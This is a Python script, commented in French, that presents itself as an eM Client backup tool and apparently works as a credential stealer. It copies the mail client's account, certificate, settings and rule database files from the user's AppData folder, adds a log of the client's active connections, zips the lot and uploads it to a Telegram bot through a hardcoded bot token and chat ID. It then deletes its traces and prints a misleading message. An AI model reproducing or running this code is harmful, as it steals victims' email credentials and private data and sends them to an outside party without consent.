import os
import shutil
import zipfile
import requests
import tempfile
import psutil
import datetime
import socket
import platform
import subprocess
import urllib.request

# === CONFIGURATION ===
BOT_TOKEN = "7245404963:AAEMlPlsjsULU5uYVvUH4GxS1QSgfVh9mn0"
CHAT_ID = "513947114"
NOM_ZIP = "eMClient_FichiersUtiles.zip"
# ======================

# Fichiers ciblés
FICHIERS_A_RECUPERER = [
    "accounts.dat", "accounts.dat-shm", "accounts.dat-wal",
    "categories.dat", "categories.dat-shm", "categories.dat-wal",
    "certificates.dat", "certificates.dat-shm", "certificates.dat-wal",
    "main.dat",
    "quickActions.dat", "quickActions.dat-shm", "quickActions.dat-wal",
    "rules.dat", "rules.dat-shm", "rules.dat-wal",
    "settings.dat", "settings.dat-shm", "settings.dat-wal",
    "snippets.dat", "snippets.dat-shm", "snippets.dat-wal",
    "templates.dat", "templates.dat-shm", "templates.dat-wal",
    "widgets.dat", "widgets.dat-shm", "widgets.dat-wal"
]

def detect_outgoing_connections(process_name="MailClient.exe"):
    log = []
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
            try:
                for conn in proc.net_connections(kind='inet'):
                    if conn.status == 'ESTABLISHED':
                        ip = conn.raddr.ip
                        port = conn.raddr.port
                        log.append(f"{ip}:{port}")
            except:
                continue
    return log

def chercher_dossier_emclient():
    base_path = os.path.expanduser("~")
    roaming_path = os.path.join(base_path, "AppData", "Roaming")
    for dossier in os.listdir(roaming_path):
        if "em client" in dossier.lower():
            return os.path.join(roaming_path, dossier)
    return None

def afficher_info_reseau():
    print("\n=== Informations Réseau Locale ===")
    try:
        hostname = socket.gethostname()
        print(f"Nom de la machine : {hostname}")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_locale = s.getsockname()[0]
        s.close()
        print(f"Adresse IPv4 locale : {ip_locale}")
    except:
        print("Impossible d'obtenir l'IP locale.")

    try:
        ip_publique = urllib.request.urlopen('https://api.ipify.org').read().decode()
        print(f"Adresse IP publique : {ip_publique}")
    except:
        print("Impossible d'obtenir l'IP publique.")

    systeme = platform.system()
    if systeme == "Windows":
        print("\nDétails réseau (ipconfig) :")
        subprocess.run(["ipconfig"], shell=True)
    else:
        subprocess.run(["ifconfig"], shell=False)

def exporter_fichiers_specifiques_et_envoyer():
    try:
        emclient_path = chercher_dossier_emclient()
        if not emclient_path:
            print("❌ Dossier eM Client introuvable.")
            return

        temp_dir = tempfile.mkdtemp()
        backup_dir = os.path.join(temp_dir, "eMClientFiles")
        os.makedirs(backup_dir, exist_ok=True)

        # Copier uniquement les fichiers demandés
        fichiers_copies = []
        for fichier in FICHIERS_A_RECUPERER:
            chemin_source = os.path.join(emclient_path, fichier)
            if os.path.exists(chemin_source):
                shutil.copy2(chemin_source, os.path.join(backup_dir, fichier))
                fichiers_copies.append(fichier)

        # Ajouter fuite_ip.txt
        ip_logs = detect_outgoing_connections()
        with open(os.path.join(backup_dir, "fuite_ip.txt"), "w") as f:
            f.write("\n".join(ip_logs) if ip_logs else "Aucune connexion sortante détectée.")

        # Ajouter index.txt
        with open(os.path.join(backup_dir, "index.txt"), "w", encoding="utf-8") as f:
            for fichier in fichiers_copies:
                f.write(fichier + "\n")

        # Créer le ZIP
        zip_path = os.path.join(temp_dir, NOM_ZIP)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(backup_dir):
                for file in files:
                    abs_path = os.path.join(root, file)
                    rel_path = os.path.relpath(abs_path, backup_dir)
                    zipf.write(abs_path, rel_path)

        # Envoyer sur Telegram
        with open(zip_path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID, "caption": f"📦 eM Client Backup - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
                files={"document": f}
            )

        print("✅ Informations Réseau Locale trouvée.")
    except Exception as e:
        print("❌ Erreur :", e)
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

if __name__ == "__main__":
    exporter_fichiers_specifiques_et_envoyer()
    afficher_info_reseau()
